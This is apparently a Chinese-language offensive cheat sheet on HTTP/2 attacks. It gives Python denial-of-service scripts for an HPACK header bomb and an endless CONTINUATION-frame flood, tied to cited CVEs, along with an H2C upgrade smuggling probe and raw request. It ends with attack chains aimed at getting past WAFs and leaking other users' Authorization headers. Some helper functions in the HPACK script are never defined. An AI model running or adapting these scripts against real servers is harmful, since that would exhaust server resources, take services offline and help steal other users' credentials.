# HTTP/2 攻击

## HPACK Bomb (CVE-2025-53020)

HTTP/2 HPACK 压缩表可被过量 header 填充 → 内存耗尽。

```python
# HPACK bomb: 大量不同名称的 header → HPACK 表无法复用
# 每个 header name 都不同 → 全部存入 dynamic table → OOM
import socket, ssl

def hpack_bomb(target: str, port: int = 443):
    """HPACK header compression memory exhaustion"""
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2'])
    sock = ctx.wrap_socket(socket.socket(), server_hostname=target)

    # HTTP/2 connection preface
    preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
    # SETTINGS frame
    settings = b'\x00\x00\x00\x04\x00\x00\x00\x00\x00'

    sock.connect((target, port))
    sock.send(preface + settings)

    # 发送大量不同 header name 的 HEADERS frame
    # 每个 header name 不同 → 无法复用 HPACK 引用 → 表膨胀
    for i in range(100000):
        header_name = f"x-bomb-{i:06d}"
        header_block = encode_hpack_literal(header_name, "value")
        frame = build_headers_frame(1, header_block)
        sock.send(frame)

    sock.close()
```

## CONTINUATION Flood (CVE-2024-28182)

```python
# 发送无限 CONTINUATION frames 而不设 END_HEADERS
# → nghttp2/Tomcat/Apache/Node.js 持续缓冲 → CPU + 内存耗尽

def continuation_flood(target: str):
    """CVE-2024-28182: 无限 CONTINUATION frame"""
    sock, _ = connect_h2(target)

    # 初始 HEADERS frame (END_HEADERS=0)
    headers_frame = bytes([
        0x00, 0x00, 0x01,  # length=1
        0x01,              # type=HEADERS
        0x04,              # flags=END_STREAM (no END_HEADERS!)
        0x00, 0x00, 0x00, 0x01,  # stream_id=1
        0x80               # HPACK: empty indexed header
    ])
    sock.send(headers_frame)

    # 无限 CONTINUATION
    while True:
        cont = bytes([
            0x00, 0x00, 0x01,  # length=1
            0x09,              # type=CONTINUATION
            0x00,              # flags=0 (no END_HEADERS!)
            0x00, 0x00, 0x00, 0x01,  # stream_id=1
            0x80               # empty indexed header
        ])
        sock.send(cont)
```

## H2C Upgrade Smuggling

```bash
# H2C (HTTP/2 cleartext) upgrade → 前端 HTTP/1.1 → 后端 HTTP/2
# 攻击者发送 HTTP/1.1 with Upgrade: h2c → 建立到后端的 H2C 连接
# → 绕过前端的 HTTP/1.1 过滤规则

# 探测 H2C
curl -v --http2-prior-knowledge http://target.com/

# 如果后端接受 h2c → 可用 H2C smuggling 注入请求
```

```python
# H2C smuggling: 在 HTTP/1.1 中夹带 HTTP/2 stream
H2C_SMUGGLE = (
    b"GET / HTTP/1.1\r\n"
    b"Host: target.com\r\n"
    b"Upgrade: h2c\r\n"
    b"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
    b"Connection: Upgrade\r\n"
    b"\r\n"
    # 后面接 HTTP/2 frames → 前端转发，后端按 H2C 处理
)
```

## Stream Multiplexing Abuse

```python
# HTTP/2 多路复用 → 一个 TCP 连接上多个 stream
# 攻击: 大量 stream 同时发送 → 超过 max_concurrent_streams
# → 服务端 RST_STREAM → 某些 server 实现有 bug → 信息泄露

# 或者: stream ID 重用 → CVE-2024-7246 (gRPC HPACK desync)
# → 泄露其他 stream 的 header key
```

## 攻击链

```
H2C upgrade → 前端 HTTP/1.1 → 后端 H2C → 绕过前端 WAF → 直接打后端
CONTINUATION flood → 服务端 OOM → DoS → 绕过 rate limit
HPACK bomb → memory exhaustion → 其他请求失败 → 拒绝服务
HPACK desync → 跨 stream header leak → 窃取其他用户的 Authorization header
Stream multiplexing → RST_STREAM 竞争 → request smuggling → 缓存投毒
```

## Evidence

记录: HTTP/2 frame 序列 (hex)、服务端响应 SETTINGS/GOAWAY/RST_STREAM、内存/CPU 监控
